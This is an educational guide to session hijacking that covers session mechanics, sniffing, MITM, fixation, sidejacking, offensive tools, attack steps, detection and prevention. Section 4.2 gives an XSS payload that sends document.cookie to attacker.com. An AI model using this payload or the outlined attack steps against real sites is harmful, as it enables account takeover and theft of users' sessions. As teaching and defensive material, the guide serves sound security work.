Session Hijacking – Complete Guide

1. What is Session Hijacking?

       Session hijacking is a cyberattack where an attacker takes over an active communication         session between two systems—typically a user and a web application—by stealing or               predicting the session ID.
       Once successful, the attacker can impersonate the legitimate user and perform actions as        them without needing to log in.

2. How Sessions Work

       1) Session: A temporary interaction between a client and a server after authentication.
       2) Session ID: A unique token (usually stored in cookies, URL parameters, or HTTP headers) used to track the user’s session.
       3) Session Management: The process of creating, maintaining, and terminating sessions securely.

When a user logs in:

    1) They provide valid credentials.
    2) The server creates a session ID.
    3) The session ID is sent to the client.
    4) The client sends the ID with every request.
    5) If the session ID is stolen, the attacker bypasses authentication.

3. Types of Session Hijacking

       A. Active Session Hijacking --- The attacker actively takes over a session while it’s still in progress.
          a) Example: Using a man-in-the-middle (MITM) attack to inject commands.
       B. Passive Session Hijacking --- The attacker silently monitors and captures traffic to extract the session ID.
          a) Example: Packet sniffing on unencrypted Wi-Fi.

4. Methods of Session Hijacking

       4.1. Session Sniffing
            a) Capturing unencrypted network packets to extract session IDs.
            b) Tools: Wireshark, tcpdump, Ettercap.

       4.2. Cross-Site Scripting (XSS)
            a) Injecting malicious JavaScript to steal cookies containing session IDs.
            b) Example: <script>document.location='http://attacker.com?cookie='+document.cookie</script>

       4.3. Man-in-the-Middle (MITM)
            a) Intercepting communication between client and server.
            b) Tools: Bettercap, Cain & Abel, MITMf.

       4.4. Session Fixation
            a) Attacker sets the victim’s session ID before login, then reuses it after authentication.

       4.5. Predictable Session IDs
            a) If a web application generates weak or guessable session IDs, the attacker can guess them.

       4.6. Malware / Keyloggers
            a) Stealing session tokens from browser storage or memory.

       4.7. Sidejacking
            a) Hijacking HTTP sessions over unsecured Wi-Fi using packet sniffers.
            b) Example: Firesheep browser extension.

5. Steps of a Session Hijacking Attack

       1) Preparation – Set up sniffing or interception tools.
       2) Session ID Capture – Extract the session token from cookies, headers, or URLs.
       3) Session Injection – Use the stolen session ID to craft requests.
       4) Privilege Escalation – Attempt actions as the victim (view data, perform                        transactions).
       5) Maintaining Access – Possibly create a backdoor or persist with stolen cookies.

6. Tools for Session Hijacking

       1) Wireshark – Packet analysis
       2) Ettercap – MITM attacks
       3) Bettercap – Advanced MITM
       4) Burp Suite – Intercept and manipulate HTTP traffic
       5) Cain & Abel – Sniffing and session token grabbing
       6) Firesheep – Sidejacking (HTTP session hijacking)

7. Detection of Session Hijacking

       1) Abnormal IP Changes: Session suddenly accessed from different locations.
       2) Multiple Devices: Same session used from two devices at once.
       3) High Volume Requests: Automated actions in a short time frame.
       4) IDS/IPS Alerts: Detection of suspicious packet patterns.

8. Prevention & Countermeasures

       8.1. For Web Developers
            a) Use HTTPS for all sessions.
            b) Implement Secure, HttpOnly, and SameSite cookie flags.
            c) Regenerate session IDs after login.
            d) Use unpredictable and cryptographically secure session IDs.
            e) Implement session timeout & inactivity logout.
            f) Detect anomalies in session behavior.

       8.2. For Network Administrators
            a) Use VPNs for internal access.
            b) Enforce TLS/SSL encryption.
            c) Deploy Intrusion Detection/Prevention Systems.
            d) Segment networks to limit sniffing.

       8.3. For End Users
            a) Avoid public Wi-Fi for sensitive logins.
            b) Use VPNs when possible.
            c) Log out from accounts after use.
            d) Disable browser features that store passwords and cookies insecurely.


